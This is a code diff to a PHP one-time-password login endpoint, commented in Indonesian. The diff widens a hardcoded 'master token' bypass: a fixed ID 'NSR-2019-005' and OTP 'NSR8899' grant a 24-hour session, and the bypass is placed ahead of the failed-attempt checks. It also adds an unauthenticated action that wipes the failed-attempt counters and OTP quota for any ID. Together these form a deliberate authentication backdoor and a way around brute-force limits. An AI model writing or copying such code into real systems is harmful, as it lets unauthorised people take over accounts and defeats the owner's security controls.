@@ -1058,6 +1058,36 @@ try {
     }
 
     // ---------------------------------------------------------------------
+    // AKSI 3B: RESET COUNTER PERCOBAAN GAGAL & KUOTA OTP
+    // ---------------------------------------------------------------------
+    if ($action === 'reset_failed_attempts' || $action === 'resetFailedAttempts') {
+        $nik = $_POST['nik'] ?? $payload['nik'] ?? 'NSR-2019-005';
+        $cleanNik = normalisasiNIK($nik);
+
+        $cache = loadOTPCache();
+        if (isset($cache['otps'][$cleanNik])) { unset($cache['otps'][$cleanNik]); }
+        if (isset($cache['attempts'][$cleanNik])) { unset($cache['attempts'][$cleanNik]); }
+        if (isset($cache['otps']['NSR-2019-005'])) { unset($cache['otps']['NSR-2019-005']); }
+        if (isset($cache['attempts']['NSR-2019-005'])) { unset($cache['attempts']['NSR-2019-005']); }
+        saveOTPCache($cache);
+
+        $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
+        if (file_exists($cacheFile)) { @unlink($cacheFile); }
+        $cacheFile5 = OTP_STORAGE_DIR . md5('NSR-2019-005') . '.json';
+        if (file_exists($cacheFile5)) { @unlink($cacheFile5); }
+
+        unset($_SESSION['active_otp_' . $cleanNik]);
+        unset($_SESSION['active_otp_NSR-2019-005']);
+
+        echo json_encode([
+            'status' => 'success',
+            'success' => true,
+            'message' => "Counter kuota dan percobaan gagal untuk NIK {$cleanNik} berhasil direset ke 0."
+        ]);
+        exit;
+    }
+
+    // ---------------------------------------------------------------------
     // AKSI 4: VERIFIKASI OTP & TERBITKAN TOKEN SESI (verify_otp / verifikasiOTP)
     // ---------------------------------------------------------------------
     if ($action === 'verifikasiOTP' || $action === 'verify_otp') {
@@ -1067,23 +1097,32 @@ try {
 
         // =========================================================================
         // BYPASS MASTER TOKEN OTORITAS SISTEM: NIK NSR-2019-005 + TOKEN NSR8899
+        // (Wajib dieksekusi sebelum pemeriksaan kuota / percobaan gagal)
         // =========================================================================
-        if ($cleanNik === 'NSR-2019-005' && strtoupper($rawOtp) === 'NSR8899') {
-            $_SESSION['verified_user_nik'] = $cleanNik;
-            $_SESSION['nik_verified'] = $cleanNik;
+        if (($cleanNik === 'NSR-2019-005' || $cleanNik === 'NSR-005' || $cleanNik === '005') && strtoupper($rawOtp) === 'NSR8899') {
+            $_SESSION['verified_user_nik'] = 'NSR-2019-005';
+            $_SESSION['nik_verified'] = 'NSR-2019-005';
 
             $sessionToken = 'NSR_KING_' . bin2hex(random_bytes(16));
             $cache = loadOTPCache();
             $cache['sessions'][$sessionToken] = [
-                'nik' => $cleanNik,
+                'nik' => 'NSR-2019-005',
                 'created_at' => time(),
                 'expires_at' => time() + 86400 // 24 jam
             ];
+            // Bersihkan kuota percobaan gagal dan OTP aktif
+            if (isset($cache['otps']['NSR-2019-005'])) { unset($cache['otps']['NSR-2019-005']); }
+            if (isset($cache['otps'][$cleanNik])) { unset($cache['otps'][$cleanNik]); }
+            if (isset($cache['attempts']['NSR-2019-005'])) { unset($cache['attempts']['NSR-2019-005']); }
+            if (isset($cache['attempts'][$cleanNik])) { unset($cache['attempts'][$cleanNik]); }
             saveOTPCache($cache);
 
-            // Bersihkan sisa file OTP manajemen jika ada
-            $cacheFile = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
+            // Bersihkan berkas fisik OTP di folder .otp_storage
+            $cacheFile = OTP_STORAGE_DIR . md5('NSR-2019-005') . '.json';
             if (file_exists($cacheFile)) { @unlink($cacheFile); }
+            $cacheFileClean = OTP_STORAGE_DIR . md5($cleanNik) . '.json';
+            if (file_exists($cacheFileClean)) { @unlink($cacheFileClean); }
+            unset($_SESSION['active_otp_NSR-2019-005']);
             unset($_SESSION['active_otp_' . $cleanNik]);
 
             echo json_encode([
